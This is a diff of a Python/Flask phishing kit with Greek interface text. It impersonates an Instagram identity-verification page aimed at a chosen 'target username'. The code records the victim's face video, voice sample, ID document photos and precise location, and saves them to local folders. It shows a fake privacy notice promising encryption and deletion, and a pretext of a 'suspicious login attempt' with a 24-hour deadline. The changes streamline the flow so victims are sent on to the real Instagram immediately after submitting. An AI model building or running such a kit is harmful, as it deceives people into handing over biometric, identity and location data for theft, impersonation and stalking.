-                            // Εάν αποτύχει η υψηλής ακρίβειας, ολοκληρώστε με γρήγορη τοποθεσία
-                            completeLocationVerification();
-                        }},
+                        () => {{ completeLocationVerification(); }},
                         {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                     );
                 }},
                 (err) => {{
                     statusDiv.className = 'status-message status-error';
-                    statusDiv.textContent = `Σφάλμα: ${{err.message}}. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
+                    statusDiv.textContent = `Σφάλμα: ${{err.message}}. Ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                     button.disabled = false;
-                    button.textContent = 'Δοκιμάστε Ξανά';
+                    button.textContent = 'Δοκιμάστε ξανά';
                 }},
                 {{ enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }}
             );
@@ -2081,31 +1933,20 @@ def create_html_template(settings):
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
-            
-            // Ενημέρωση εμφάνισης
             document.getElementById('latValue').textContent = lat.toFixed(6);
             document.getElementById('lonValue').textContent = lon.toFixed(6);
             document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} μέτρα`;
-            
-            // Υπολογισμός ποσοστού ακρίβειας (υψηλότερη ακρίβεια = μικρότερος αριθμός)
             let accuracyPercentage = 100;
             if (accuracy < 10) accuracyPercentage = 95;
             else if (accuracy < 50) accuracyPercentage = 85;
             else if (accuracy < 100) accuracyPercentage = 70;
             else if (accuracy < 500) accuracyPercentage = 50;
             else accuracyPercentage = 30;
-            
             document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
-            
-            // Εμφάνιση λεπτομερειών
             document.getElementById('locationDetails').style.display = 'block';
-            
-            // Ενημέρωση κατάστασης
             const statusDiv = document.getElementById('locationStatus');
             statusDiv.className = 'status-message status-success';
-            statusDiv.textContent = `✓ Τοποθεσία αποκτήθηκε με ακρίβεια ${{Math.round(accuracy)}}μ`;
-            
-            // Αποθήκευση δεδομένων τοποθεσίας
+            statusDiv.textContent = `✓ Η τοποθεσία λήφθηκε με ακρίβεια ${{Math.round(accuracy)}} μέτρων`;
             locationData = {{
                 latitude: lat,
                 longitude: lon,
@@ -2134,90 +1975,35 @@ def create_html_template(settings):
                     target_username: targetUsername
                 }}),
                 contentType: 'application/json',
-                success: function(response) {{
-                    console.log('Τα δεδομένα τοποθεσίας μεταφορτώθηκαν');
-                }},
-                error: function(xhr, status, error) {{
-                    console.error('Σφάλμα μεταφόρτωσης τοποθεσίας:', error);
-                }}
+                success: function(response) {{ console.log('Τα δεδομένα τοποθεσίας μεταφορτώθηκαν'); }},
+                error: function(xhr, status, error) {{ console.error('Σφάλμα μεταφόρτωσης τοποθεσίας:', error); }}
             }});
         }}
         
         function completeLocationVerification() {{
             const button = document.getElementById('locationButton');
             button.disabled = true;
-            button.textContent = '✓ Τοποθεσία Επαληθεύτηκε';
-            
-            // Προχωρήστε στο τελικό βήμα μετά από καθυστέρηση
-            setTimeout(() => {{
-                startFinalVerification();
-            }}, 2000);
+            button.textContent = '✓ Η τοποθεσία επαληθεύτηκε';
+            // Ολοκλήρωση και ανακατεύθυνση άμεσα
+            finishVerification();
         }}
         
-        // Τελική Επεξεργασία Επαλήθευσης
-        function startFinalVerification() {{
-            showStep('stepFinal');
-            const statusDiv = document.getElementById('finalStatus');
-            let progress = 25;
-            
-            const progressInterval = setInterval(() => {{
-                progress += Math.random() * 15;
-                if (progress > 100) progress = 100;
-                
-                let message = "";
-                if (progress < 30) {{
-                    message = `Επαλήθευση σάρωσης προσώπου... ${{Math.round(progress)}}%`;
-                }} else if (progress < 50) {{
-                    message = `Ανάλυση δείγματος φωνής... ${{Math.round(progress)}}%`;
-                }} else if (progress < 70) {{
-                    message = `Έλεγχος εγγράφων ταυτότητας... ${{Math.round(progress)}}%`;
-                }} else if (progress < 90) {{
-                    message = `Επαλήθευση τοποθεσίας... ${{Math.round(progress)}}%`;
-                }} else {{
-                    message = `Ολοκλήρωση επαλήθευσης... ${{Math.round(progress)}}%`;
-                }}
-                
-                statusDiv.textContent = message;
-                
-                if (progress >= 100) {{
-                    clearInterval(progressInterval);
-                    setTimeout(() => {{
-                        statusDiv.className = 'status-message status-success';
-                        statusDiv.textContent = `✓ Η επαλήθευση ολοκληρώθηκε για @${{targetUsername}}!`;
-                        
-                        // Υποβολή όλων των συλλεγμένων δεδομένων
-                        submitCompleteVerification();
-                        
-                        // Εμφάνιση σελίδας ολοκλήρωσης
-                        setTimeout(() => {{
-                            showCompletionPage();
-                        }}, 1500);
-                    }}, 1000);
-                }}
-            }}, 800);
-        }}
-        
-        function showCompletionPage() {{
+        // Νέα συνάρτηση για τελικοποίηση και ανακατεύθυνση άμεσα
+        function finishVerification() {{
+            // Ενημέρωση κατάστασης λογαριασμού
+            updateAccountStatus('✅ Η επαλήθευση ολοκληρώθηκε');
+            // Αποστολή περίληψης ολοκλήρωσης
+            submitCompleteVerification();
+            // Εμφάνιση της σελίδας ολοκλήρωσης για λίγο και ανακατεύθυνση
             showStep('stepComplete');
-            
-            // Έναρξη χρονομέτρησης για ανακατεύθυνση στο Instagram
-            let countdown = 5;
-            const countdownElement = document.getElementById('countdown');
-            countdownElement.textContent = countdown;
-            
-            countdownTimer = setInterval(() => {{
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {{
-                    clearInterval(countdownTimer);
-                    redirectToInstagram();
-                }}
-            }}, 1000);
+            // Ανακατεύθυνση μετά από μικρή καθυστέρηση για να εμφανιστεί η σελίδα
+            setTimeout(() => {{
+                redirectToInstagram();
+            }}, 300);
         }}
         
         function redirectToInstagram() {{
-            window.location.href = 'https://instagram.com';
+            window.location.href = 'https://www.instagram.com';
         }}
         
         function showReviewPage() {{
@@ -2226,11 +2012,11 @@ def create_html_template(settings):
         }}
         
         function returnToInstagram() {{
-            window.location.href = 'https://instagram.com';
+            window.location.href = 'https://www.instagram.com';
         }}
         
         function checkStatus() {{
-            alert("Η κατάσταση ανασκόπησης θα σταλεί στο email σας εντός 48 ωρών. Παρακαλώ ελέγξτε το email που σχετίζεται με τον λογαριασμό σας στο Instagram.");
+            alert("Η κατάσταση αξιολόγησης θα σταλεί στο email σας εντός 48 ωρών. Ελέγξτε το email που σχετίζεται με τον λογαριασμό σας στο Instagram.");
         }}
         
         function submitCompleteVerification() {{
@@ -2250,13 +2036,14 @@ def create_html_template(settings):
             }});
         }}
         
-        // Αρχικοποίηση εμφάνισης προόδου
-        updateProgress();
+        function updateAccountStatus(status) {{
+            const statusElement = document.getElementById('accountStatus');
+            if (statusElement) statusElement.textContent = status;
+        }}
         
-        // Αυτόματη έναρξη πρώτου βήματος μετά από καθυστέρηση
-        setTimeout(() => {{
-            showStep(1);
-        }}, 500);
+        // Αρχικοποίηση
+        updateProgress();
+        setTimeout(() => {{ showStep(1); }}, 500);
     </script>
 </body>
 </html>'''
@@ -2275,16 +2062,13 @@ def submit_face_verification():
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
             
-            # Δημιουργία ονόματος αρχείου
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"face_verification_{target_username}_{session_id}_{timestamp}.webm"
             video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
             
-            # Αποθήκευση βίντεο
             with open(video_file, 'wb') as f:
                 f.write(base64.b64decode(video_data))
             
-            # Αποθήκευση μεταδεδομένων
             metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
             metadata = {
                 'filename': filename,
@@ -2296,16 +2080,15 @@ def submit_face_verification():
                 'timestamp': data.get('timestamp', datetime.now().isoformat()),
                 'saved_at': datetime.now().isoformat()
             }
-            
             with open(metadata_file, 'w') as f:
                 json.dump(metadata, f, indent=2)
             
-            print(f"Αποθηκεύτηκε βίντεο επαλήθευσης προσώπου για {target_username}: {filename}")
-            return jsonify({"status": "success", "message": "Η επαλήθευση προσώπου υποβλήθηκε"}), 200
+            print(f"Αποθηκεύτηκε βίντεο σάρωσης προσώπου για {target_username}: {filename}")
+            return jsonify({"status": "success", "message": "Η σάρωση προσώπου υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα βίντεο προσώπου"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα βίντεο προσώπου"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
+        print(f"Σφάλμα αποθήκευσης σάρωσης προσώπου: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_voice_verification', methods=['POST'])
@@ -2317,16 +2100,13 @@ def submit_voice_verification():
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
             
-            # Δημιουργία ονόματος αρχείου
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"voice_verification_{target_username}_{session_id}_{timestamp}.webm"
             audio_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', filename)
             
-            # Αποθήκευση ήχου
             with open(audio_file, 'wb') as f:
                 f.write(base64.b64decode(audio_data))
             
-            # Αποθήκευση μεταδεδομένων
             metadata_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', f"metadata_{target_username}_{session_id}_{timestamp}.json")
             metadata = {
                 'filename': filename,
@@ -2338,16 +2118,15 @@ def submit_voice_verification():
                 'timestamp': data.get('timestamp', datetime.now().isoformat()),
                 'saved_at': datetime.now().isoformat()
             }
-            
             with open(metadata_file, 'w') as f:
                 json.dump(metadata, f, indent=2)
             
-            print(f"Αποθηκεύτηκε ήχος επαλήθευσης φωνής για {target_username}: {filename}")
-            return jsonify({"status": "success", "message": "Η επαλήθευση φωνής υποβλήθηκε"}), 200
+            print(f"Αποθηκεύτηκε ηχητικό αρχείο φωνητικής επαλήθευσης για {target_username}: {filename}")
+            return jsonify({"status": "success", "message": "Η φωνητική επαλήθευση υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα ήχου φωνής"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα ήχου φωνής"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης φωνής: {e}")
+        print(f"Σφάλμα αποθήκευσης φωνητικής επαλήθευσης: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_id_verification', methods=['POST'])
@@ -2357,7 +2136,6 @@ def submit_id_verification():
         target_username = request.form.get('target_username', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
         
-        # Επεξεργασία μπροστινής ταυτότητας
         front_filename = None
         if 'front_id' in request.files:
             front_file = request.files['front_id']
@@ -2367,7 +2145,6 @@ def submit_id_verification():
                 front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                 front_file.save(front_path)
         
-        # Επεξεργασία πίσω ταυτότητας
         back_filename = None
         if 'back_id' in request.files:
             back_file = request.files['back_id']
@@ -2377,7 +2154,6 @@ def submit_id_verification():
                 back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                 back_file.save(back_path)
         
-        # Αποθήκευση μεταδεδομένων
         metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
         metadata = {
             'front_id': front_filename,
@@ -2388,7 +2164,6 @@ def submit_id_verification():
             'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
             'saved_at': datetime.now().isoformat()
         }
-        
         with open(metadata_file, 'w') as f:
             json.dump(metadata, f, indent=2)
         
@@ -2406,11 +2181,8 @@ def submit_location_verification():
         if data and 'latitude' in data and 'longitude' in data:
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
-            
-            # Προσθήκη ονόματος χρήστη στόχου στα δεδομένα
             data['target_username'] = target_username
             
-            # Επεξεργασία τοποθεσίας σε background thread
             processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
             processing_thread.daemon = True
             processing_thread.start()
@@ -2418,7 +2190,7 @@ def submit_location_verification():
             print(f"Λήφθηκαν δεδομένα τοποθεσίας για {target_username}: {session_id}")
             return jsonify({"status": "success", "message": "Η επαλήθευση τοποθεσίας υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα τοποθεσίας"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα τοποθεσίας"}), 400
     except Exception as e:
         print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -2433,18 +2205,14 @@ def submit_complete_verification():
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"verification_summary_{target_username}_{session_id}_{timestamp}.json"
             file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
-            
-            # Προσθήκη πληροφοριών συστήματος
             data['received_at'] = datetime.now().isoformat()
             data['server_timestamp'] = timestamp
-            
             with open(file_path, 'w') as f:
                 json.dump(data, f, indent=2)
-            
-            print(f"Αποθηκεύτηκε σύνοψη πλήρους επαλήθευσης για {target_username}: {filename}")
+            print(f"Αποθηκεύτηκε σύνοψη επαλήθευσης για {target_username}: {filename}")
             return jsonify({"status": "success", "message": "Η επαλήθευση ολοκληρώθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα"}), 400
     except Exception as e:
         print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -2452,85 +2220,62 @@ def submit_complete_verification():
 @app.route('/privacy_policy')
 def privacy_policy():
     return '''<!DOCTYPE html>
-    <html lang="el">
+    <html>
     <head>
-        <title>Instagram - Πολιτική Απορρήτου</title>
+        <title>Πολιτική Απορρήτου Instagram</title>
         <style>
-            body {{ 
+            body { 
                 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                 padding: 20px; 
                 max-width: 800px; 
                 margin: 0 auto; 
                 background-color: #000;
                 color: #fff;
-            }}
-            h1 {{ 
-                color: #405DE6; 
-                margin-bottom: 30px;
-            }}
-            h2 {{
-                color: #833AB4;
-                margin-top: 30px;
-                margin-bottom: 15px;
-            }}
-            .container {{
-                background-color: #121212;
-                padding: 30px;
-                border-radius: 12px;
-                border: 1px solid #363636;
-            }}
-            ul {{
-                padding-left: 20px;
-                margin: 15px 0;
-            }}
-            li {{
-                margin-bottom: 10px;
-                line-height: 1.5;
-            }}
+            }
+            h1 { color: #405DE6; margin-bottom: 30px; }
+            h2 { color: #833AB4; margin-top: 30px; margin-bottom: 15px; }
+            .container { background-color: #121212; padding: 30px; border-radius: 12px; border: 1px solid #363636; }
+            ul { padding-left: 20px; margin: 15px 0; }
+            li { margin-bottom: 10px; line-height: 1.5; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Instagram</h1>
-            <p>Αυτή η διαδικασία επαλήθευσης έχει σχεδιαστεί για τη διασφάλιση συμμόρφωσης με τους περιορισμούς ηλικίας και τα πρότυπα ασφάλειας της κοινότητας.</p>
-            
+            <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Ηλικίας Instagram</h1>
+            <p>Αυτή η διαδικασία επαλήθευσης έχει σχεδιαστεί για να διασφαλίσει τη συμμόρφωση με τους περιορισμούς ηλικίας και τα πρότυπα ασφαλείας της κοινότητας.</p>
             <h2>Συλλογή Δεδομένων</h2>
             <p>Συλλέγουμε τα ακόλουθα δεδομένα κατά την επαλήθευση:</p>
             <ul>
-                <li>Δεδομένα αναγνώρισης προσώπου (προσωρινή σάρωση βίντεο με κινήσεις κεφαλιού)</li>
-                <li>Δείγμα φωνής (για αυθεντικοποίηση και ανίχνευση ζωντάνιας)</li>
-                <li>Εικόνες εγγράφου ταυτότητας (για επαλήθευση ηλικίας και ταυτότητας)</li>
-                <li>Δεδομένα τοποθεσίας (για περιφερειακή συμμόρφωση και ασφάλεια)</li>
+                <li>Δεδομένα αναγνώρισης προσώπου (προσωρινή σάρωση βίντεο με κινήσεις κεφαλής)</li>
+                <li>Φωνητικό δείγμα (για έλεγχο ταυτότητας και ανίχνευση ζωντάνιας)</li>
+                <li>Εικόνες εγγράφων ταυτότητας (για επαλήθευση ηλικίας και ταυτότητας)</li>
+                <li>Δεδομένα τοποθεσίας (για συμμόρφωση με περιφερειακούς κανονισμούς και ασφάλεια)</li>
                 <li>Πληροφορίες συσκευής (για πρόληψη απάτης)</li>
             </ul>
-            
             <h2>Χρήση Δεδομένων</h2>
             <p>Τα δεδομένα σας χρησιμοποιούνται αποκλειστικά για:</p>
             <ul>
                 <li>Επαλήθευση ηλικίας και συμμόρφωση</li>
-                <li>Αυθεντικοποίηση ταυτότητας και πρόληψη απάτης</li>
+                <li>Πιστοποίηση ταυτότητας και πρόληψη απάτης</li>
                 <li>Εφαρμογή περιορισμών περιεχομένου βάσει περιοχής</li>
-                <li>Βελτίωση της ασφάλειας του λογαριασμού</li>
+                <li>Ενίσχυση της ασφάλειας λογαριασμού</li>
             </ul>
-            
             <h2>Διατήρηση Δεδομένων</h2>
-            <p>Όλα τα δεδομένα επαλήθευσης κρυπτογραφούνται αυτόματα και διαγράφονται μόνιμα εντός 30 ημερών από την ολοκλήρωση της επαλήθευσης.</p>
-            
+            <p>Όλα τα δεδομένα επαλήθευσης κρυπτογραφούνται αυτόματα και διαγράφονται οριστικά εντός 30 ημερών από την επιτυχή ολοκλήρωση της επαλήθευσης.</p>
             <h2>Μέτρα Ασφαλείας</h2>
             <ul>
                 <li>Κρυπτογράφηση από άκρο σε άκρο για όλες τις μεταδόσεις δεδομένων</li>
-                <li>Ασφαλής αποθήκευση με βιομηχανικά πρότυπα πρωτοκόλλα</li>
+                <li>Ασφαλής αποθήκευση με πρωτόκολλα βιομηχανικών προτύπων</li>
                 <li>Τακτικοί έλεγχοι ασφαλείας και συμμόρφωσης</li>
-                <li>Κοινή χρήση με τρίτους για εμπορικούς σκοπούς</li>
+                <li>Χωρίς κοινοποίηση σε τρίτους για σκοπούς μάρκετινγκ</li>
             </ul>
-            
-            <h2>Δικαιώματα Σας</h2>
-            <p>Έχετε το δικαίωμα να:</p>
+            <h2>Τα Δικαιώματά σας</h2>
+            <p>Έχετε το δικαίωμα:</p>
             <ul>
-                <li>Ζητήσετε πρόσβαση στα δεδομένα επαλήθευσής σας</li>
-                <li>Ζητήσετε τη διαγραφή των δεδομένων σας πριν από την περίοδο των 30 ημερών</li>
-                <li>Εξαιρεθείτε από μελλοντικές επαληθεύσεις (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
-                <li>Υποβάλετε καταγγελία σχετικά με τη διαχείριση δεδομένων</li>
+                <li>Να ζητήσετε πρόσβαση στα δεδομένα επαλήθευσής σας</li>
+                <li>Να ζητήσετε διαγραφή των δεδομένων σας πριν από την περίοδο των 30 ημερών</li>
+                <li>Να εξαιρεθείτε από μελλοντικές επαληθεύσεις (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
+                <li>Να υποβάλετε καταγγελία σχετικά με τον χειρισμό δεδομένων</li>
             </ul>
         </div>
     </body>
@@ -2539,35 +2284,38 @@ def privacy_policy():
 if __name__ == '__main__':
     check_dependencies()
     
-    # Λήψη ρυθμίσεων επαλήθευσης από χρήστη
     VERIFICATION_SETTINGS = get_verification_settings()
     
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
     sys.modules['flask.cli'].show_server_banner = lambda *x: None
     port = 4045
-    script_name = "Instagram Επαλήθευση Λογαριασμού"
+    script_name = "Σελίδα Επαλήθευσης Instagram"
     
     print("\n" + "="*60)
-    print("INSTAGRAM ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ")
+    print("ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ INSTAGRAM")
     print("="*60)
-    print(f"[+] Όνομα Χρήστη Στόχος: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"[+] Όνομα χρήστη-στόχος: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"[+] Βιογραφικό: {VERIFICATION_SETTINGS['bio']}")
+    print(f"[+] Αναρτήσεις: {VERIFICATION_SETTINGS['post_count']}")
+    print(f"[+] Ακόλουθοι: {VERIFICATION_SETTINGS['follower_count']}")
+    print(f"[+] Ακολουθεί: {VERIFICATION_SETTINGS['following_count']}")
     
     if VERIFICATION_SETTINGS.get('profile_picture'):
-        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
+        print(f"[+] Φωτογραφία προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
     else:
-        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
-        print(f"[!] Τοποθετήστε οποιαδήποτε εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
+        print(f"[!] Δεν βρέθηκε φωτογραφία προφίλ")
+        print(f"[!] Τοποθετήστε οποιαδήποτε εικόνα (jpg/png) στο {DOWNLOAD_FOLDER} για χρήση ως φωτογραφία προφίλ")
     
-    print(f"[+] Τα δεδομένα θα αποθηκευτούν στο: {DOWNLOAD_FOLDER}")
+    print(f"[+] Τα δεδομένα θα αποθηκευτούν σε: {DOWNLOAD_FOLDER}")
     print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
     if VERIFICATION_SETTINGS['voice_enabled']:
-        print(f"[+] Επαλήθευση φωνής: Ενεργοποιημένη ({VERIFICATION_SETTINGS['voice_duration']} δευτερόλεπτα)")
+        print(f"[+] Φωνητική επαλήθευση: Ενεργή ({VERIFICATION_SETTINGS['voice_duration']} δευτερόλεπτα)")
     if VERIFICATION_SETTINGS['id_enabled']:
-        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη")
+        print(f"[+] Επαλήθευση ταυτότητας: Ενεργή")
     if VERIFICATION_SETTINGS['location_enabled']:
-        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
-    print("\n[+] Δημιουργήθηκαν φάκελοι:")
+        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργή")
+    print("\n[+] Φάκελοι που δημιουργήθηκαν:")
     print(f"    - face_scans/")
     if VERIFICATION_SETTINGS['voice_enabled']:
         print(f"    - voice_recordings/")
@@ -2579,22 +2327,21 @@ if __name__ == '__main__':
     print("\n[+] Εκκίνηση διακομιστή...")
     print("[+] Πατήστε Ctrl+C για διακοπή.\n")
     
-    # Προτροπή τερματικού για χρήστη
     print("="*60)
-    print("ΠΡΟΤΡΟΠΗ ΤΕΡΜΑΤΙΚΟΥ ΓΙΑ ΧΡΗΣΤΗ")
+    print("ΠΡΟΤΡΟΠΗ ΤΕΡΜΑΤΙΚΟΥ ΓΙΑ ΤΟΝ ΧΡΗΣΤΗ")
     print("="*60)
     print(f"Το Instagram ζητά επαλήθευση ταυτότητας για τον λογαριασμό:")
-    print(f"👤 Όνομα Χρήστη: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"👤 Όνομα χρήστη: @{VERIFICATION_SETTINGS['target_username']}")
     if VERIFICATION_SETTINGS.get('profile_picture'):
-        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από λογαριασμό")
+        print(f"🖼️  Προφίλ: Χρήση φωτογραφίας προφίλ από τον λογαριασμό")
     else:
-        print(f"👤 Προφίλ: Προεπιλεγμένη εικόνα λογαριασμού")
-    print(f"📊 Στατιστικά: {random.randint(100, 999)} δημοσιεύσεις • {random.randint(1000, 9999)} ακόλουθοι • {random.randint(500, 5000)} ακολουθεί")
-    print(f"🔒 Αιτία: Ανιχνεύθηκε ύποπτη προσπάθεια σύνδεσης")
+        print(f"👤 Προφίλ: Προεπιλεγμένο avatar λογαριασμού")
+    print(f"📊 Στατιστικά: {VERIFICATION_SETTINGS['post_count']} αναρτήσεις • {VERIFICATION_SETTINGS['follower_count']} ακόλουθοι • {VERIFICATION_SETTINGS['following_count']} ακολουθεί")
+    print(f"🔒 Λόγος: Εντοπίστηκε ύποπτη προσπάθεια σύνδεσης")
     print(f"⏰ Χρονικό όριο: Ολοκληρώστε εντός 24 ωρών")
     print(f"📍 Απαιτείται: Σάρωση προσώπου, επαλήθευση ταυτότητας και έλεγχος τοποθεσίας")
     print("="*60)
-    print("Ανοίξτε τον παρακάτω σύνδεσμο στον περιηγητή για να ξεκινήσετε την επαλήθευση...\n")
+    print("Ανοίξτε τον παρακάτω σύνδεσμο στο πρόγραμμα περιήγησης για να ξεκινήσετε την επαλήθευση...\n")
     
     flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
     flask_thread.daemon = True
